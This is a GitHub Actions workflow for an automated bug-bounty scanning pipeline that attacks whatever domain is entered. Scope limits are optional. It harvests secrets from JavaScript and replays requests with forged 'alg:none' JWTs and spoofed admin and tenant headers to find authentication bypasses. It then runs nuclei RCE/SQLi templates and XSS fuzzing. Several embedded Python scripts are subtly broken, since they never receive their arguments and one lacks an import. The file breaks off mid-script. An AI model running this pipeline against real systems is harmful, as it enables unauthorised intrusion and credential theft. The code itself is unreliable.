name: "💀 ELITE Bug Bounty Triage Engine"

on:
  workflow_dispatch:
    inputs:
      domain:
        description: "الدومين المستهدف"
        required: true
      scope:
        description: "النطاق المسموح (regex - اتركه فارغ للكل)"
        required: false
        default: ""
      denylist:
        description: "نطاقات محظورة (مفصولة بفواصل)"
        required: false
        default: ""
      max_hosts:
        description: "أقصى عدد hosts للفحص"
        required: false
        default: "50"

jobs:
  elite-triage:
    runs-on: ubuntu-latest
    timeout-minutes: 480
    permissions:
      contents: write

    steps:
      - uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - uses: actions/setup-go@v5
        with:
          go-version: "1.22"

      # ═══════════════════════════════════════════════════
      # PHASE 0: ARSENAL + INFRASTRUCTURE
      # ═══════════════════════════════════════════════════
      - name: "⚡ Arsenal Installation"
        run: |
          export GOPATH=$HOME/go
          export PATH=$PATH:$HOME/go/bin
          
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/projectdiscovery/katana/cmd/katana@latest
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
          go install github.com/ffuf/ffuf/v2@latest
          go install github.com/tomnomnom/gf@latest
          go install github.com/tomnomnom/anew@latest
          go install github.com/tomnomnom/qsreplace@latest
          go install github.com/lc/gau/v2/cmd/gau@latest
          go install github.com/tomnomnom/waybackurls@latest
          go install github.com/hahwul/dalfox/v2@latest
          go install github.com/owasp-amass/amass/v4/...@latest 2>/dev/null || true
          go install github.com/tomnomnom/assetfinder@latest
          
          pip install linkfinder secretfinder jsluice uro paramspider clairvoyance --quiet 2>/dev/null || true
          
          nuclei -update-templates -silent 2>/dev/null || true
          mkdir -p ~/.gf
          git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns /tmp/gfp 2>/dev/null || true
          cp /tmp/gfp/*.json ~/.gf/ 2>/dev/null || true
          
          wget -q https://github.com/epi052/feroxbuster/releases/latest/download/feroxbuster_linux_amd64.tar.gz -O /tmp/ferox.tar.gz
          tar -xzf /tmp/ferox.tar.gz -C /usr/local/bin feroxbuster 2>/dev/null || true
          
          git clone --depth 1 https://github.com/danielmiessler/SecLists /tmp/seclists 2>/dev/null || true
          
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: "🗄️ Initialize Correlation Database"
        run: |
          D=${{ github.event.inputs.domain }}
          echo "DOMAIN=$D" >> $GITHUB_ENV
          mkdir -p /tmp/elite/$D/{recon,js,graphql,diffs,scanning,correlation,ai}
          
          sqlite3 /tmp/elite/$D/correlation/engine.db << 'SQLEOF'
          PRAGMA journal_mode=WAL;
          PRAGMA synchronous=NORMAL;
          
          CREATE TABLE IF NOT EXISTS endpoints (
            id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE, method TEXT DEFAULT 'GET',
            status_code INTEGER, content_type TEXT, tech_stack TEXT, asset_type TEXT,
            weight INTEGER DEFAULT 1, auth_required INTEGER DEFAULT 0, tenant_sensitive INTEGER DEFAULT 0
          );
          CREATE TABLE IF NOT EXISTS parameters (
            id INTEGER PRIMARY KEY AUTOINCREMENT, endpoint_id INTEGER, param_name TEXT,
            param_type TEXT, value_sample TEXT, entropy_score REAL DEFAULT 0, FOREIGN KEY(endpoint_id) REFERENCES endpoints(id)
          );
          CREATE TABLE IF NOT EXISTS secrets (
            id INTEGER PRIMARY KEY AUTOINCREMENT, source_url TEXT, secret_type TEXT,
            secret_value TEXT, severity TEXT, context TEXT
          );
          CREATE TABLE IF NOT EXISTS graphql_ops (
            id INTEGER PRIMARY KEY AUTOINCREMENT, endpoint_id INTEGER, operation_name TEXT,
            operation_type TEXT, fields TEXT, requires_auth INTEGER DEFAULT 0, is_mutation INTEGER DEFAULT 0
          );
          CREATE TABLE IF NOT EXISTS behavioral_diffs (
            id INTEGER PRIMARY KEY AUTOINCREMENT, endpoint_url TEXT, test_type TEXT, diff_type TEXT,
            base_status INTEGER, test_status INTEGER, details TEXT, severity TEXT, chain_potential TEXT
          );
          CREATE INDEX IF NOT EXISTS idx_endpoints_asset ON endpoints(asset_type);
          CREATE INDEX IF NOT EXISTS idx_diffs_severity ON behavioral_diffs(severity);
          SQLEOF
          
          echo "DB_INITIALIZED=1" >> $GITHUB_ENV

      # ═══════════════════════════════════════════════════
      # PHASE 1: DEEP RECON + FINGERPRINTING
      # ═══════════════════════════════════════════════════
      - name: "🔍 Phase 1A: Multi-Source Subdomain Enumeration"
        run: |
          D=${{ env.DOMAIN }}
          subfinder -d $D -all -silent -o /tmp/elite/$D/recon/subfinder.txt 2>/dev/null || true
          amass enum -passive -d $D -o /tmp/elite/$D/recon/amass.txt 2>/dev/null || true
          assetfinder --subs-only $D > /tmp/elite/$D/recon/assetfinder.txt 2>/dev/null || true
          curl -s "https://crt.sh/?q=%25.$D&output=json" | jq -r '.[].name_value' | sort -u > /tmp/elite/$D/recon/crtsh.txt 2>/dev/null || true
          
          cat /tmp/elite/$D/recon/*.txt 2>/dev/null | sort -u | grep -v "^$" > /tmp/elite/$D/recon/all_subs.txt
          
          SCOPE="${{ github.event.inputs.scope }}"
          DENY="${{ github.event.inputs.denylist }}"
          
          if [ -n "$SCOPE" ]; then grep -E "$SCOPE" /tmp/elite/$D/recon/all_subs.txt > /tmp/elite/$D/recon/scoped_subs.txt || true; else cp /tmp/elite/$D/recon/all_subs.txt /tmp/elite/$D/recon/scoped_subs.txt; fi
          if [ -n "$DENY" ]; then IFS=',' read -ra DENY_LIST <<< "$DENY"; for d in "${DENY_LIST[@]}"; do sed -i "/$d/d" /tmp/elite/$D/recon/scoped_subs.txt; done; fi
          
          echo "TOTAL_SUBS=$(wc -l < /tmp/elite/$D/recon/scoped_subs.txt)" >> $GITHUB_ENV

      - name: "🌐 Phase 1B: HTTP Fingerprinting + Environment Classification"
        run: |
          D=${{ env.DOMAIN }}
          MAX=${{ github.event.inputs.max_hosts || 50 }}
          
          cat /tmp/elite/$D/recon/scoped_subs.txt | head -n $MAX | httpx -silent -threads 80 -status-code -tech-detect -title -content-type -tls-grab -favicon -cdn -follow-redirects -json -o /tmp/elite/$D/recon/fingerprint.json 2>/dev/null || true
          
          cat /tmp/elite/$D/recon/fingerprint.json | python3 << 'PYEOF'
          import json, sys, sqlite3
          db = sqlite3.connect(f"/tmp/elite/{sys.argv[1]}/correlation/engine.db")
          cursor = db.cursor()
          WEIGHT_MAP = {'admin': 10, 'dashboard': 10, 'billing': 10, 'payment': 10, 'support': 9, 'helpdesk': 9, 'graphql': 9, 'api': 8, 'internal': 9, 'staging': 8, 'dev': 7, 'export': 8, 'oauth': 8, 'sso': 8, 'auth': 7, 'upload': 7, 'webhook': 7, 'cdn': 1, 'static': 1, 'marketing': 1}
          
          for line in sys.stdin:
              try:
                  h = json.loads(line.strip())
                  url, status, tech = h.get('url', ''), h.get('status_code', 0), ','.join(h.get('tech', []))
                  title = h.get('title', '')
                  asset_type, weight = 'generic', 1
                  url_lower = url.lower()
                  for pattern, w in WEIGHT_MAP.items():
                      if pattern in url_lower or pattern in title.lower(): asset_type, weight = pattern, max(weight, w)
                  if any(x in url_lower for x in ['staging', 'stg', 'dev', 'test', 'uat']): asset_type, weight = 'staging', max(weight, 8)
                  auth_required = 1 if (status in [401, 403] or any(x in tech.lower() for x in ['oauth', 'auth0', 'cognito'])) else 0
                  cursor.execute('INSERT OR IGNORE INTO endpoints (url, status_code, tech_stack, asset_type, weight, auth_required) VALUES (?, ?, ?, ?, ?, ?)', (url, status, tech, asset_type, weight, auth_required))
              except: pass
          db.commit(); db.close()
          PYEOF "$D"
          
          cat /tmp/elite/$D/recon/fingerprint.json | jq -r '.url' | sort -u > /tmp/elite/$D/recon/live_hosts.txt
          LIVE=$(wc -l < /tmp/elite/$D/recon/live_hosts.txt)
          echo "LIVE_HOSTS=$LIVE" >> $GITHUB_ENV
          echo "HIGH_VALUE_ASSETS=$(sqlite3 /tmp/elite/$D/correlation/engine.db "SELECT COUNT(*) FROM endpoints WHERE weight >= 8")" >> $GITHUB_ENV

      # ═══════════════════════════════════════════════════
      # PHASE 2: JS INTELLIGENCE LAYER (FIXED)
      # ═══════════════════════════════════════════════════
      - name: "📜 Phase 2A: JS LinkFinder + Hidden Endpoints"
        run: |
          D=${{ env.DOMAIN }}
          mkdir -p /tmp/elite/$D/js/raw
          touch /tmp/elite/$D/js/endpoints.txt
          
          cat /tmp/elite/$D/recon/live_hosts.txt | head -30 | while read host; do
              curl -sk "$host" 2>/dev/null | grep -oE 'src="[^"]+\.js"' | awk -F'"' '{print $2}' | while read js; do
                  js_url="$host$js"
                  filename=$(echo "$js_url" | md5sum | cut -c1-12)
                  curl -sk "$js_url" -o "/tmp/elite/$D/js/raw/$filename.js" 2>/dev/null || true
                  if [ -s "/tmp/elite/$D/js/raw/$filename.js" ]; then
                      linkfinder -i "/tmp/elite/$D/js/raw/$filename.js" -o cli 2>/dev/null | grep -E "^https?://" | head -50 >> /tmp/elite/$D/js/endpoints.txt
                  fi
              done
          done 2>/dev/null || true
          
          cat /tmp/elite/$D/js/endpoints.txt 2>/dev/null | sort -u | python3 << 'PYEOF'
          import sys, sqlite3
          db = sqlite3.connect(f'/tmp/elite/{sys.argv[1]}/correlation/engine.db')
          cursor = db.cursor()
          for line in sys.stdin:
              endpoint = line.strip()
              if not endpoint: continue
              ep_lower = endpoint.lower()
              if any(x in ep_lower for x in ['/api/', '/graphql']): asset, weight = "api", 8
              elif any(x in ep_lower for x in ['/admin/', '/dashboard']): asset, weight = "admin", 10
              elif any(x in ep_lower for x in ['/internal/', '/staging']): asset, weight = "internal", 9
              elif any(x in ep_lower for x in ['/export/', '/download']): asset, weight = "export", 8
              else: asset, weight = "js_hidden", 5
              cursor.execute("INSERT OR IGNORE INTO endpoints (url, asset_type, weight) VALUES (?, ?, ?)", (endpoint, asset, weight))
          db.commit(); db.close()
          PYEOF "$D"

      - name: "🔑 Phase 2B: SecretFinder + jsluice"
        run: |
          D=${{ env.DOMAIN }}
          DB=/tmp/elite/$D/correlation/engine.db
          touch /tmp/elite/$D/js/jsluice_urls.txt
          
          python3 << 'PYEOF'
          import os, json, sqlite3, subprocess, sys
          domain = sys.argv[1]
          db = sqlite3.connect(f'/tmp/elite/{domain}/correlation/engine.db')
          cursor = db.cursor()
          CRITICAL_TYPES = {'aws', 'azure', 'gcp', 'private_key', 'ssh', 'password'}
          HIGH_TYPES = {'api_key', 'token', 'secret'}
          
          for filename in os.listdir(f'/tmp/elite/{domain}/js/raw'):
              if not filename.endswith('.js'): continue
              filepath = os.path.join(f'/tmp/elite/{domain}/js/raw', filename)
              try:
                  result = subprocess.run(['secretfinder', '-i', filepath, '-o', 'json'], capture_output=True, text=True, timeout=30)
                  secrets_list = json.loads(result.stdout) if result.stdout.strip() else []
              except: secrets_list = []
              
              for s in secrets_list:
                  secret_type = s.get('type', 'unknown').lower()
                  secret_value = str(s.get('value', ''))[:200]
                  sev = 'critical' if any(ct in secret_type for ct in CRITICAL_TYPES) else 'high' if any(ht in secret_type for ht in HIGH_TYPES) else 'medium'
                  cursor.execute('INSERT INTO secrets (source_url, secret_type, secret_value, severity) VALUES (?, ?, ?, ?)', (filepath, secret_type, secret_value, sev))
              
              try:
                  result = subprocess.run(['jsluice', 'urls', filepath], capture_output=True, text=True, timeout=30)
                  with open(f'/tmp/elite/{domain}/js/jsluice_urls.txt', 'a') as f: f.write(result.stdout[:200])
              except: pass
          db.commit(); db.close()
          PYEOF "$D"
          
          echo "CRIT_SECRETS=$(sqlite3 $DB "SELECT COUNT(*) FROM secrets WHERE severity='critical'")" >> $GITHUB_ENV
          echo "HIGH_SECRETS=$(sqlite3 $DB "SELECT COUNT(*) FROM secrets WHERE severity='high'")" >> $GITHUB_ENV

      # ═══════════════════════════════════════════════════
      # PHASE 3: GRAPHQL INTELLIGENCE (FIXED)
      # ═══════════════════════════════════════════════════
      - name: "🔮 Phase 3: GraphQL Discovery + Fallback Logic"
        run: |
          D=${{ env.DOMAIN }}
          grep -iE "graphql|gql" /tmp/elite/$D/recon/fingerprint.json 2>/dev/null | jq -r '.url' >> /tmp/elite/$D/graphql/endpoints.txt || true
          grep -iE "/graphql|/gql" /tmp/elite/$D/js/endpoints.txt 2>/dev/null >> /tmp/elite/$D/graphql/endpoints.txt || true
          
          cat /tmp/elite/$D/recon/live_hosts.txt | head -20 | while read host; do
              for path in /graphql /graphql/v1 /api/graphql /gql /query; do
                  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$host$path" 2>/dev/null)
                  if [ "$STATUS" = "200" ] || [ "$STATUS" = "400" ]; then echo "${host}${path}" >> /tmp/elite/$D/graphql/endpoints.txt; fi
              done
          done
          
          sort -u /tmp/elite/$D/graphql/endpoints.txt 2>/dev/null > /tmp/elite/$D/graphql/unique_endpoints.txt || true
          
          cat /tmp/elite/$D/graphql/unique_endpoints.txt 2>/dev/null | while read gql_url; do
              [ -z "$gql_url" ] && continue
              INTRO=$(curl -sk -X POST "$gql_url" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}","variables":null}' 2>/dev/null)
              
              if echo "$INTRO" | grep -q '"types"'; then
                  echo "$INTRO" > /tmp/gql_intro_$$.json
                  python3 << 'PYEOF'
                  import json, sqlite3, sys, os
                  gql_url, domain, tmp_file = sys.argv[1], sys.argv[2], sys.argv[3]
                  db = sqlite3.connect(f'/tmp/elite/{domain}/correlation/engine.db')
                  cursor = db.cursor()
                  try:
                      with open(tmp_file) as f: intro = json.load(f)
                      cursor.execute("INSERT OR IGNORE INTO endpoints (url, asset_type, weight) VALUES (?, 'graphql', 9)", (gql_url,))
                      for t in intro.get('data', {}).get('__schema', {}).get('types', []):
                          name = t.get('name', '')
                          if name in ['Query', 'Mutation']:
                              for field in t.get('fields', []):
                                  fname = field.get('name', '')
                                  is_mut = 1 if name == 'Mutation' else 0
                                  cursor.execute('INSERT INTO graphql_ops (endpoint_id, operation_name, operation_type, is_mutation) VALUES ((SELECT id FROM endpoints WHERE url=?), ?, ?, ?)', (gql_url, fname, name, is_mut))
                  except: pass
                  finally: db.commit(); db.close(); os.unlink(tmp_file) if os.path.exists(tmp_file) else None
                  PYEOF "$gql_url" "$D" "/tmp/gql_intro_$$.json"
              else
                  clairvoyance "$gql_url" -o "/tmp/elite/$D/graphql/clairvoyance_$$.txt" 2>/dev/null || true
                  for suggestion in 'mutations{__typename}' 'query{__typename}'; do
                      RESP=$(curl -sk -X POST "$gql_url" -H "Content-Type: application/json" -d "{\"query\":\"$suggestion\"}" 2>/dev/null)
                      if ! echo "$RESP" | grep -qiE "error|forbidden|denied"; then echo "$gql_url" >> /tmp/elite/$D/graphql/fallback_success.txt; break; fi
                  done
              fi
              
              ALIAS_RESP=$(curl -sk -X POST "$gql_url" -H "Content-Type: application/json" -d '{"query":"query{alias1:__typename alias2:__typename}"}' 2>/dev/null)
              if echo "$ALIAS_RESP" | grep -q '"alias1"'; then echo "$gql_url" >> /tmp/elite/$D/graphql/alias_abuse.txt; fi
              sleep $((RANDOM % 3 + 1))
          done
          
          echo "GRAPHQL_ENDPOINTS=$(wc -l < /tmp/elite/$D/graphql/unique_endpoints.txt 2>/dev/null || echo 0)" >> $GITHUB_ENV

      # ═══════════════════════════════════════════════════
      # PHASE 4: BEHAVIORAL CLASSIFICATION
      # ═══════════════════════════════════════════════════
      - name: "🧬 Phase 4: Endpoint Classification + JWT Analysis"
        run: |
          D=${{ env.DOMAIN }}
          cat /tmp/elite/$D/recon/live_hosts.txt | gau --threads 5 --subs 2>/dev/null | head -5000 > /tmp/elite/$D/recon/gau.txt || true
          cat /tmp/elite/$D/recon/live_hosts.txt | waybackurls 2>/dev/null | head -5000 >> /tmp/elite/$D/recon/gau.txt || true
          cat /tmp/elite/$D/recon/live_hosts.txt | katana -d 3 -jc -silent -c 30 2>/dev/null | head -3000 >> /tmp/elite/$D/recon/gau.txt || true
          
          cat /tmp/elite/$D/recon/gau.txt /tmp/elite/$D/js/endpoints.txt 2>/dev/null | sort -u | uro > /tmp/elite/$D/recon/all_urls.txt 2>/dev/null || sort -u /tmp/elite/$D/recon/gau.txt /tmp/elite/$D/js/endpoints.txt > /tmp/elite/$D/recon/all_urls.txt
          echo "TOTAL_URLS=$(wc -l < /tmp/elite/$D/recon/all_urls.txt)" >> $GITHUB_ENV
          
          cat /tmp/elite/$D/recon/all_urls.txt | python3 << 'PYEOF'
          import re, sys, sqlite3, math
          from urllib.parse import urlparse, parse_qs
          db = sqlite3.connect(f'/tmp/elite/{sys.argv[1]}/correlation/engine.db')
          cursor = db.cursor()
          AUTH_P, ADMIN_P, TENANT_P, PAY_P, EXP_P, SUP_P = r'(login|auth|oauth|sso|session|token|verify)', r'(admin|dashboard|manage|console)', r'(org|tenant|account|workspace|team)', r'(billing|payment|invoice)', r'(export|download|backup)', r'(support|help|ticket|chat)'
          
          for line in sys.stdin:
              url = line.strip()
              if not url: continue
              path = urlparse(url).path.lower()
              auth_req, tenant_sens, asset_type, weight = 0, 0, 'generic', 1
              if re.search(AUTH_P, path): auth_req, asset_type, weight = 1, 'auth', max(weight, 7)
              if re.search(ADMIN_P, path): auth_req, asset_type, weight = 1, 'admin', max(weight, 10)
              if re.search(TENANT_P, path): tenant_sens, weight = 1, max(weight, 8)
              if re.search(PAY_P, path): auth_req, asset_type, weight = 1, 'billing', max(weight, 10)
              if re.search(EXP_P, path): auth_req, asset_type, weight = 1, 'export', max(weight, 8)
              if re.search(SUP_P, path): asset_type, weight = 'support', max(weight, 9)
              
              cursor.execute('INSERT OR IGNORE INTO endpoints (url, asset_type, weight, auth_required, tenant_sensitive) VALUES (?, ?, ?, ?, ?)', (url, asset_type, weight, auth_req, tenant_sens))
              
              for pname, vals in parse_qs(urlparse(url).query).items():
                  val = vals[0] if vals else ''
                  ptype = 'identifier' if re.search(r'(id|uid|user|account|org|tenant)', pname, re.I) else 'auth_token' if re.search(r'(token|key|secret|auth)', pname, re.I) else 'redirect' if re.search(r'(redirect|url|next)', pname, re.I) else 'path_traversal' if re.search(r'(file|upload|path)', pname, re.I) else 'generic'
                  entropy = 0
                  if val:
                      freq = {c: val.count(c) for c in val}
                      entropy = -sum((f/len(val)) * math.log2(f/len(val)) for f in freq.values())
                  cursor.execute('INSERT INTO parameters (endpoint_id, param_name, param_type, value_sample, entropy_score) VALUES ((SELECT id FROM endpoints WHERE url=?), ?, ?, ?, ?)', (url, pname, ptype, val[:100], entropy))
          db.commit(); db.close()
          PYEOF "$D"
          
          echo "AUTH_ENDPOINTS=$(sqlite3 /tmp/elite/$D/correlation/engine.db "SELECT COUNT(*) FROM endpoints WHERE auth_required=1")" >> $GITHUB_ENV
          echo "TENANT_ENDPOINTS=$(sqlite3 /tmp/elite/$D/correlation/engine.db "SELECT COUNT(*) FROM endpoints WHERE tenant_sensitive=1")" >> $GITHUB_ENV

      # ═══════════════════════════════════════════════════
      # PHASE 5: DIFFERENTIAL ANALYSIS (FIXED)
      # ═══════════════════════════════════════════════════
      - name: "⚖️ Phase 5: Auth-State Differential Replay"
        run: |
          D=${{ env.DOMAIN }}
          DB=/tmp/elite/$D/correlation/engine.db
          sqlite3 $DB "SELECT url FROM endpoints WHERE weight >= 7 AND auth_required=1 ORDER BY weight DESC LIMIT 30" > /tmp/diff_targets.txt
          
          while IFS= read -r endpoint; do
              [ -z "$endpoint" ] && continue
              
              BASE_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 "$endpoint" 2>/dev/null) || BASE_STATUS=0
              FAKE_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0In0." -H "X-Forwarded-User: admin" "$endpoint" 2>/dev/null) || FAKE_STATUS=0
              NONE_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." "$endpoint" 2>/dev/null) || NONE_STATUS=0
              TENANT_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 -H "X-Tenant-ID: 1" -H "X-Organization-ID: 1" "$endpoint" 2>/dev/null) || TENANT_STATUS=0
              ADMIN_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 -H "X-Role: admin" -H "X-User-Role: administrator" -H "X-Admin: true" "$endpoint" 2>/dev/null) || ADMIN_STATUS=0
              METHOD_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 -X POST -H "X-HTTP-Method-Override: GET" -H "Content-Type: application/json" "$endpoint" 2>/dev/null) || METHOD_STATUS=0
              
              cat > /tmp/diff_result_$$.json << DIFFJSON
          {"endpoint": "$endpoint", "base": $BASE_STATUS, "fake": $FAKE_STATUS, "none_alg": $NONE_STATUS, "tenant": $TENANT_STATUS, "admin": $ADMIN_STATUS, "method": $METHOD_STATUS}
          DIFFJSON
              
              python3 << 'PYEOF'
              import json, sqlite3, sys, os
              domain, tmp_file = sys.argv[1], sys.argv[2]
              db = sqlite3.connect(f'/tmp/elite/{domain}/correlation/engine.db')
              cursor = db.cursor()
              try:
                  with open(tmp_file) as f: data = json.load(f)
              except: data = {}
              
              ep = data.get('endpoint', '')
              b, f, n, t, a, m = int(data.get('base', 0)), int(data.get('fake', 0)), int(data.get('none_alg', 0)), int(data.get('tenant', 0)), int(data.get('admin', 0)), int(data.get('method', 0))
              diffs = []
              
              if b in [401, 403] and f not in [401, 403, 0]: diffs.append(('AUTH_BYPASS_FAKE_TOKEN', 'critical', f'Fake token bypass (base={b}, fake={f})', f, 'Horizontal Privilege Escalation'))
              if b in [401, 403] and n in [200, 201, 204]: diffs.append(('JWT_NONE_ALG_BYPASS', 'critical', f'Algorithm confusion accepted (base={b}, none={n})', n, 'Full Authentication Bypass'))
              if b in [401, 403, 404] and t == 200: diffs.append(('TENANT_SWITCH', 'high', f'Tenant header bypass (base={b}, tenant={t})', t, 'Cross-Tenant Data Extraction'))
              if b != 200 and a == 200: diffs.append(('ADMIN_ESCALATION', 'critical', f'Admin role header bypass (base={b}, admin={a})', a, 'Full Compromise'))
              if m == 200 and b in [405, 501]: diffs.append(('METHOD_OVERRIDE', 'high', f'Method override bypass (base={b}, method={m})', m, 'Bypass Restrictions'))
              
              for dtype, sev, det, tst, chain in diffs:
                  cursor.execute('INSERT INTO behavioral_diffs (endpoint_url, test_type, diff_type, base_status, test_status, details, severity, chain_potential) VALUES (?, ?, ?, ?, ?, ?, ?, ?)', (ep, 'auth_replay', dtype, b, tst, det, sev, chain))
              db.commit(); db.close()
              try: os.unlink(tmp_file)
              except: pass
              PYEOF "$D" "/tmp/diff_result_$$.json"
              
              sleep $((RANDOM % 3 + 1))
          done < /tmp/diff_targets.txt
          
          echo "DIFFS_FOUND=$(sqlite3 $DB "SELECT COUNT(*) FROM behavioral_diffs")" >> $GITHUB_ENV
          echo "CRIT_DIFFS=$(sqlite3 $DB "SELECT COUNT(*) FROM behavioral_diffs WHERE severity='critical'")" >> $GITHUB_ENV

      # ═══════════════════════════════════════════════════
      # PHASE 6 & 7: HIGH-SIGNAL SCANNING + CORRELATION
      # ═══════════════════════════════════════════════════
      - name: "🎯 Phase 6: Targeted Scanning"
        run: |
          D=${{ env.DOMAIN }}
          sqlite3 /tmp/elite/$D/correlation/engine.db "SELECT url FROM endpoints WHERE weight >= 8" | httpx -silent -threads 50 | nuclei -silent -json -tags graphql,jwt,oauth,auth-bypass,idor,ssrf,takeover,rce,sqli -severity critical,high,medium -rl 30 -c 15 -timeout 10 -o /tmp/elite/$D/scanning/nuclei_high.json 2>/dev/null || true
          cat /tmp/elite/$D/recon/live_hosts.txt | nuclei -silent -json -severity critical,high -rl 50 -c 25 -timeout 15 -o /tmp/elite/$D/scanning/nuclei_crit.json 2>/dev/null || true
          cat /tmp/elite/$D/scanning/nuclei_*.json 2>/dev/null | sort -u > /tmp/elite/$D/scanning/all_nuclei.json
          
          for P in ssrf xss sqli lfi rce idor redirect cors; do gf $P /tmp/elite/$D/recon/all_urls.txt > /tmp/elite/$D/scanning/gf_$P.txt 2>/dev/null || touch /tmp/elite/$D/scanning/gf_$P.txt; done
          if [ -s /tmp/elite/$D/scanning/gf_xss.txt ]; then head -80 /tmp/elite/$D/scanning/gf_xss.txt | sort -u | dalfox pipe --silence --only-poc r --output /tmp/elite/$D/scanning/xss_poc.txt --worker 25 --timeout 8 2>/dev/null || true; fi
          
          echo "NUCLEI_TOTAL=$(wc -l < /tmp/elite/$D/scanning/all_nuclei.json 2>/dev/null || echo 0)" >> $GITHUB_ENV

      - name: "🧮 Phase 7: Multi-Signal Correlation"
        run: |
          D=${{ env.DOMAIN }}
          python3 << 'PYEOF'
          import sqlite3, json, os
          db = sqlite3.connect(f'/tmp/elite/{sys.argv[1]}/correlation/engine.db')
          cursor = db.cursor()
          cursor.execute('''CREATE TABLE IF NOT EXISTS correlated_findings (id INTEGER PRIMARY KEY AUTOINCREMENT, finding_type TEXT, severity TEXT, title TEXT, evidence TEXT, chain_potential TEXT, bounty_estimate INTEGER)''')
          
          cursor.execute('SELECT bd.endpoint_url, bd.diff_type, bd.details, e.asset_type, e.weight FROM behavioral_diffs bd JOIN endpoints e ON bd.endpoint_url = e.url WHERE bd.severity = "critical"')
          for url, dtype, det, atype, w in cursor.fetchall():
              bounty = 8000 if w >= 10 and 'ADMIN' in dtype else 5000 if w >= 10 else 3000
              cursor.execute('INSERT INTO correlated_findings (finding_type, severity, title, evidence, chain_potential, bounty_estimate) VALUES (?, ?, ?, ?, ?, ?)', ('AUTH_DIFF', 'critical', f'{dtype} on {atype}', f'{url}\n{det}', 'Direct access', bounty))
          
          cursor.execute('SELECT secret_type, secret_value, source_url, severity FROM secrets WHERE severity IN ("critical", "high")')
          for stype, sval, surl, sev in cursor.fetchall():
              cursor.execute('INSERT INTO correlated_findings (finding_type, severity, title, evidence, chain_potential, bounty_estimate) VALUES (?, ?, ?, ?, ?, ?)', ('EXPOSED_SECRET', sev, f'{stype} exposed', f'Source: {surl}', 'Infra Access', 2000 if sev == 'critical' else 1000))
          
          nuclei_file = f'/tmp/elite/{sys.argv[1]}/scanning/all_nuclei.json'
          if os.path.exists(nuclei_file):
              with open(nuclei_file) as f:
                  for line in f:
                      try:
                          r = json.loads(line.strip())
                          url = r.get('matched-at', '')
                          name = r.get('info', {}).get('name', '')
                          severity = r.get('info', {}).get('severity', 'info')
                          if severity in ['critical', 'high']:
                              cursor.execute('INSERT INTO correlated_findings (finding_type, severity, title, evidence, chain_potential, bounty_estimate) VALUES (?, ?, ?, ?, ?, ?)', ('NUCLEI', severity, name, f'URL: {url}', '', 1500 if severity == 'critical' else 800))
                      except: pass
          
          db.commit()
          total = cursor.execute("SELECT COUNT(*) FROM correlated_findings").fetchone()[0]
          crit = cursor.execute("SELECT COUNT(*) FROM correlated_findings WHERE severity='critical'").fetchone()[0]
          bounty = cursor.execute("SELECT SUM(bounty_estimate) FROM correlated_findings").fetchone()[0] or 0
          print(f"CORR_FINDINGS={total}\nCORR_CRITICAL={crit}\nCORR_BOUNTY={bounty}")
          db.close()
          PYEOF "$D" >> $GITHUB_ENV

      # ═══════════════════════════════════════════════════
      # PHASE 8: ELITE AI TRIAGE (BULLETPROOF PYTHON FIX)
      # ═══════════════════════════════════════════════════
      - name: "🧠 Phase 8: Elite AI Correlation Triage"
        run: |
          mkdir -p /tmp/elite/${{ env.DOMAIN }}/ai
          python3 << 'PYEOF'
          import json, sqlite3, sys, os, time, urllib.request, urllib.error
          
          domain = sys.argv[1]
          api_key = sys.argv[2]
          db_path = f'/tmp/elite/{domain}/correlation/engine.db'
          scan_dir = f'/tmp/elite/{domain}/scanning'
          out_file = f'/tmp/elite/{domain}/ai/elite_report.md'
          
          db = sqlite3.connect(db_path)
          db.row_factory = sqlite3.Row
          cursor = db.cursor()
          signal_parts = []
          
          # 1. Extract Signals safely
          cursor.execute("SELECT * FROM correlated_findings WHERE severity='critical' ORDER BY bounty_estimate DESC LIMIT 10")
          crit = [dict(row) for row in cursor.fetchall()]
          if crit: signal_parts.append("=== CRITICAL CORRELATED FINDINGS ===\n" + json.dumps(crit, indent=2, default=str))
          
          cursor.execute("SELECT * FROM behavioral_diffs WHERE severity IN ('critical', 'high') LIMIT 15")
          diffs = [dict(row) for row in cursor.fetchall()]
          if diffs: signal_parts.append("=== BEHAVIORAL DIFFS ===\n" + json.dumps(diffs, indent=2, default=str))
          
          cursor.execute("SELECT secret_type, secret_value, source_url FROM secrets WHERE severity IN ('critical', 'high') LIMIT 10")
          secrets = [dict(row) for row in cursor.fetchall()]
          if secrets:
              for s in secrets:
                  val = s.get('secret_value', '')
                  if len(val) > 20: s['secret_value'] = val[:10] + '...[TRUNCATED]...' + val[-5:]
              signal_parts.append("=== CRITICAL SECRETS ===\n" + json.dumps(secrets, indent=2, default=str))
          
          cursor.execute("SELECT go.operation_name, go.operation_type, e.url FROM graphql_ops go JOIN endpoints e ON go.endpoint_id = e.endpoint_id WHERE go.is_mutation=1 AND go.operation_name LIKE '%admin%'")
          gql = [dict(row) for row in cursor.fetchall()]
          if gql: signal_parts.append("=== HIGH-VALUE GRAPHQL ===\n" + json.dumps(gql, indent=2, default=str))
          
          xss_file = f'{scan_dir}/xss_poc.txt'
          if os.path.exists(xss_file):
              with open(xss_file) as f: xss_data = f.read()[:1000]
